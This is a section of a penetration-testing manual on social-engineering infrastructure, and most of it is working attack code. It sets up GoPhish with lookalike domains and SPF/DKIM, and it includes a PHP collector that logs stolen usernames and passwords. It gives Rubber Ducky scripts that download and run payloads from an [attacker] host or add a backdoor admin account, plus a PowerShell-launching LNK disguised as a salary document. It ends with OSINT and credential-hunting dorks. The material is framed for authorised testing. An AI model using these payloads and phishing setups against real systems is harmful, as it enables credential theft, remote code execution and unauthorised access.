---

## SECTION 16: SOCIAL ENGINEERING — PAYLOAD BOOK INTEGRATION

*Social engineering attack methodology, pretext scripts, phishing templates, vishing scripts, and physical access techniques are covered in full in the **SE Handbook** (companion volume in the Penetration Testing Reference Suite).*

*This section provides the technical infrastructure layer — the tooling, delivery mechanisms, and tracking that support a social engineering engagement — and cross-references the SE Handbook for the human-layer content.*

---

### 16.1 Phishing Infrastructure Setup

A phishing campaign requires technical infrastructure before running any pretext. The pretext and templates are in the SE Handbook. This section covers the technical stack.

#### GoPhish Installation and Configuration

GoPhish is the open-source phishing framework used to manage campaigns, track clicks, and capture credentials.

```bash
# Download GoPhish
wget https://github.com/gophish/gophish/releases/latest/download/gophish-[version]-linux-64bit.zip
unzip gophish-*.zip && cd gophish/
chmod +x gophish
./gophish
# Admin interface: https://localhost:3333 (default admin:gophish)
```

GoPhish components:
- **Sending Profile** — SMTP server config (use your domain's MTA or external relay)
- **Landing Page** — cloned or custom credential capture page (import by URL)
- **Email Template** — the phishing email body (content from SE Handbook)
- **Users & Groups** — target list imported from CSV
- **Campaign** — ties all components together, sets launch time

#### Email Domain Setup for Phishing

For deliverability and to pass spam filters:

```bash
# 1. Register a lookalike domain (e.g. company-support.com for target company.com)
# 2. Set up Postfix MTA:
apt install postfix -y
# /etc/postfix/main.cf key settings:
# myhostname = mail.company-support.com
# mydomain = company-support.com
# myorigin = $mydomain

# 3. SPF record (add to DNS):
# TXT @ "v=spf1 ip4:[your_server_ip] -all"

# 4. DKIM setup:
apt install opendkim opendkim-tools -y
opendkim-genkey -t -s mail -d company-support.com
# Add public key to DNS as TXT mail._domainkey

# 5. DMARC record:
# TXT _dmarc "v=DMARC1; p=none; rua=mailto:dmarc@company-support.com"

# Verify deliverability:
# mail-tester.com — score check before launch
```

#### Credential Capture Page Setup

```bash
# Clone a target login page with GoPhish's import feature, OR:
# Manual clone using wget:
wget -r -l 1 -nd -P cloned_page/ https://target-login-page.com/

# Modify to POST captured creds + redirect to real site:
# In cloned form, change action to your collection endpoint
# Simple PHP collector:
cat > collect.php << 'EOF'
<?php
$data = date('[Y-m-d H:i:s]') . " " . $_SERVER['REMOTE_ADDR'] . " | ";
$data .= "user=" . ($_POST['username'] ?? '') . " pass=" . ($_POST['password'] ?? '') . "\n";
file_put_contents('/var/log/creds.txt', $data, FILE_APPEND);
header('Location: https://[real-target-site]/login?error=1');
exit();
EOF
```

#### OOB Tracking for Email Opens

```bash
# interactsh-client: self-hosted callback server
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -server interactsh.com -n 10

# Use the generated URL as a 1x1 pixel image src in phishing email:
# <img src="https://[generated].oast.fun/track?c=[campaign_id]" width="1" height="1">
# Open = DNS/HTTP callback logged

# Burp Collaborator (Pro): same principle
# canarytokens.org: free hosted option
```

---

### 16.2 SE Handbook Cross-Reference

| SE Technique | SE Handbook Section | What It Contains |
|---|---|---|
| Passive OSINT for target research | Chapter 1 | theHarvester, LinkedIn, Shodan, email format, org chart |
| Phishing pretext selection | Chapter 2 | Pretext categories, authority/urgency principles |
| Phishing email templates | Chapter 3 | Full templates: IT reset, O365, invoice, voicemail |
| Vishing scripts | Chapter 4 | Call scripts, objection handling, exec impersonation |
| Physical pretexts | Chapter 5 | Tailgating, delivery, contractor, inspector |
| USB drop campaigns | Chapter 6 | Drop scenarios, payload types, tracking |
| Pretexting for password reset | Chapter 7 | Help desk social engineering scripts |
| SE awareness training | Chapter 8 | How to teach targets to recognise these attacks |

**Reference path:** See companion volume: *SE Handbook*

---

### 16.3 USB Drop Technical Payloads

USB drop execution payloads — these are the technical component of a USB drop attack (scenario selection is in SE Handbook Chapter 6).

#### HID Attack Platforms

- **USB Rubber Ducky** (Hak5): Ducky Script, plug-and-type, appears as keyboard
- **Bash Bunny** (Hak5): multi-payload, supports HID + storage + network
- **O.MG Cable**: HID attacks via what appears to be a charging cable
- **DIY via Arduino/Digispark**: programmable HID for budget builds

#### Ducky Script Patterns

```
# Basic Ducky Script structure:
DELAY 1000          # Wait 1 second for host to recognise HID
GUI r               # Windows key + r (Run dialog)
DELAY 500
STRING powershell -w hidden -c "[payload here]"
ENTER

# Download and execute (PowerShell):
DELAY 1000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://[attacker]/payload.ps1')"
ENTER

# Add backdoor user:
DELAY 1000
GUI r
DELAY 500
STRING cmd /c net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add
ENTER

# macOS: Terminal via Spotlight
COMMAND SPACE
DELAY 500
STRING terminal
ENTER
DELAY 800
STRING curl -s http://[attacker]/mac_payload.sh | bash
ENTER
```

#### Malicious LNK File (No Rubber Ducky Required)

A crafted .lnk file that executes a payload when opened. Disguised as a document.

```powershell
# Create malicious .lnk via PowerShell (on attacker Windows machine):
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("Salaries_2026.lnk")
$shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Arguments = '-nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://[attacker]/payload.ps1'')"'
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,1"  # Word doc icon
$shortcut.Save()
# Change icon to Word/PDF/Excel icon for social engineering
```

#### autorun.inf (Legacy — Windows XP/7 Only)

```
[autorun]
open=payload.exe
icon=document.ico
label=USB Drive
```
*Note: Autorun disabled by default on Windows Vista+. Include only for legacy/air-gapped environments where old OS is known.*

---

### 16.4 OSINT Tools for Pre-Engagement Reconnaissance

Technical OSINT commands used before SE engagement. Intelligence gathered feeds into SE Handbook pretext selection.

```bash
# theHarvester — email, subdomain, employee discovery
theHarvester -d [target-domain] -l 500 -b google,linkedin,bing,duckduckgo,twitter

# Shodan CLI — exposed services and banners
shodan search org:"[Company Name]" --fields ip_str,port,org,hostnames
shodan host [ip]  # full host report

# Subfinder — passive subdomain enumeration
subfinder -d [target-domain] -silent

# crt.sh — certificate transparency (find subdomains)
curl -s "https://crt.sh/?q=%25.[target-domain]&output=json" | jq '.[].name_value' | sort -u

# Amass — comprehensive subdomain discovery
amass enum -passive -d [target-domain]

# LinkedIn OSINT (manual — no API key needed):
# Search: site:linkedin.com/in "[Company Name]" [role]
# Collect: names, titles, emails (infer from format)

# Email format discovery:
# Hunter.io: free tier shows format if company has entries
# Method: send to first.last@company.com, first@company.com, f.last@company.com
# SMTP verify: use smtp-user-enum or manual RCPT TO test

# Google dorks for target:
# site:[target.com] filetype:pdf   → documents with internal structure
# site:[target.com] inurl:admin    → admin panels
# site:[target.com] "powered by"   → technology disclosure
# "[Company Name]" filetype:xlsx   → data files
# "[Company Name]" "password" filetype:txt  → credential exposure
```

---

*SE technical infrastructure complete. For pretext scripts, phishing templates, vishing call scripts, physical security bypass techniques, and SE awareness training content — see the SE Handbook.*

*Campaign Guide Chapter 5 covers the full SE engagement workflow (how these technical components integrate with the human-layer techniques from the SE Handbook).*
